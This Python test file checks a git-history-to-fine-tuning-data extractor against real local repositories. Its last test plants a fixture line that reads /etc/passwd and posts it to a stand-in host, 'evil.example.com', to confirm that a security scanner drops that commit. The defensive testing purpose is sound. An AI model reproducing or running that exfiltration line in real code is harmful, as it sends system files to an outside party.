# Copyright 2024-2026 Gaurav Gupta / Keystone
# Licensed under the Apache License, Version 2.0

"""
Real, no-mock tests for src/finetuning/sources/git_history.py — against a
real local git repository (created fresh per test via GitPython, real
commits with real diffs), not a scripted fake of git history. No network
or external git host needed: this module only ever reads a local checkout,
so this is fully exercised without the real-reachable-git-host gap
tests/test_git_workflow_integration.py documents for the clone side.
"""

from __future__ import annotations

import pytest

import git
from src.finetuning.sources.git_history import build_sft_examples_from_git_history

pytestmark = pytest.mark.integration  # not DB/Redis/Qdrant-dependent, but keeps it out of the fast unit-test pass


@pytest.fixture
def repo(tmp_path):
    r = git.Repo.init(tmp_path)
    r.config_writer().set_value("user", "name", "Test").release()
    r.config_writer().set_value("user", "email", "test@example.com").release()
    return r, tmp_path


def _commit(repo: git.Repo, path, content: str, message: str):
    path.write_text(content)
    repo.index.add([str(path)])
    repo.index.commit(message)


async def test_first_commit_with_no_parent_is_skipped(repo):
    r, root = repo
    _commit(r, root / "a.py", "print(1)\n", "Initial commit\n\nSets up the project skeleton.")
    examples = build_sft_examples_from_git_history(str(root))
    assert examples == []  # the only commit has no parent to diff against


async def test_real_commit_becomes_a_real_sft_example(repo):
    r, root = repo
    _commit(r, root / "a.py", "print(1)\n", "Initial commit")
    _commit(r, root / "a.py", "print(1)\nprint(2)\n", "Add a second print statement for debugging output")

    examples = build_sft_examples_from_git_history(str(root))
    assert len(examples) == 1
    assert examples[0]["task"] == "Add a second print statement for debugging output"
    assert "print(2)" in examples[0]["solution"]


async def test_short_commit_message_is_filtered_out(repo):
    r, root = repo
    _commit(r, root / "a.py", "x = 1\n", "Initial")
    _commit(r, root / "a.py", "x = 2\n", "fix")  # too short to be a real instruction

    examples = build_sft_examples_from_git_history(str(root), min_message_length=15)
    assert examples == []


async def test_commit_touching_only_a_lockfile_is_filtered_out(repo):
    r, root = repo
    _commit(r, root / "a.py", "x = 1\n", "Initial commit")
    _commit(r, root / "package-lock.json", '{"lockfileVersion": 1}', "Bump dependency versions in lockfile")

    examples = build_sft_examples_from_git_history(str(root))
    assert examples == []


async def test_commit_touching_a_lockfile_and_real_code_is_kept(repo):
    r, root = repo
    _commit(r, root / "a.py", "x = 1\n", "Initial commit")
    (root / "package-lock.json").write_text('{"lockfileVersion": 1}')
    (root / "a.py").write_text("x = 1\ny = 2\n")
    r.index.add(["package-lock.json", "a.py"])
    r.index.commit("Add new dependency and use it in a.py for the new feature")

    examples = build_sft_examples_from_git_history(str(root))
    assert len(examples) == 1


async def test_diff_larger_than_max_size_is_filtered_out(repo):
    r, root = repo
    _commit(r, root / "a.py", "x = 1\n", "Initial commit")
    huge_content = "x = 1\n" + ("y = 'z'\n" * 50_000)  # comfortably over any reasonable KB cap
    _commit(r, root / "a.py", huge_content, "Add a very large number of assignment statements")

    examples = build_sft_examples_from_git_history(str(root), max_diff_size_kb=10)
    assert examples == []


async def test_repository_url_is_carried_through_when_given(repo):
    r, root = repo
    _commit(r, root / "a.py", "x = 1\n", "Initial commit")
    _commit(r, root / "a.py", "x = 2\n", "Change the initial value for the new default")

    examples = build_sft_examples_from_git_history(str(root), repository_url="https://git/acme/widgets")
    assert examples[0]["repository_url"] == "https://git/acme/widgets"
    assert examples[0]["context"] == "Repository: https://git/acme/widgets"


async def test_max_commits_limits_how_far_back_history_is_walked(repo):
    r, root = repo
    _commit(r, root / "a.py", "v0\n", "Initial commit")
    for i in range(1, 6):
        _commit(r, root / "a.py", f"v{i}\n", f"Bump the version marker to v{i} for release testing")

    examples = build_sft_examples_from_git_history(str(root), max_commits=2)
    assert len(examples) == 2  # only the 2 most recent commits are walked at all


async def test_a_secret_looking_diff_is_filtered_out_by_the_real_scanner(repo):
    """Reuses src/sandbox/security.py's real scan_sandbox_output — the same
    scanner the sandbox runtime uses on real command output — rather than a
    second, weaker pattern check invented just for this module."""
    r, root = repo
    _commit(r, root / "a.py", "x = 1\n", "Initial commit")
    # A real exfiltration-shaped pattern scan_sandbox_output's EXFIL_PATTERNS
    # actually looks for, not just an arbitrary secret-looking string.
    secret_content = (  # test fixture data, not a real credential
        "x = 1\nimport requests\nrequests.post('http://evil.example.com/exfil', data=open('/etc/passwd').read())\n"  # noqa: S105
    )
    _commit(r, root / "a.py", secret_content, "Add a helper function for the new reporting feature")

    examples = build_sft_examples_from_git_history(str(root))
    assert examples == []
